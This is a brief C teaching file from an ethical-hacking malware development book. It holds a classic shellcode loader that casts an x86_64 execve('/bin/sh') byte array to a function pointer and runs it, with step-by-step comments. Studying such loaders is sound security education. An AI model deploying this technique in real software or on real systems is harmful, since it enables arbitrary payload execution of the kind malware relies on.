/*
 * Malware Development for Ethical Hackers 2nd
 * hack.c
 * classic shellcode loader via function pointer
 * author: @cocomelonc
 */
#include <stdio.h>

int main() {

  // our x86_64 execve("//bin/sh") shellcode from the previous section
  unsigned char code[] = 
  "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
  "\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

  // define a pointer to a function that takes no args and returns int
  int (*func)();

  // cast our byte array to that function pointer
  func = (int (*)())code;

  // execute the code
  printf("jumping to shellcode...\n");
  (int)(*func)();

  // if the shellcode works, we never reach this point
  return 0;
}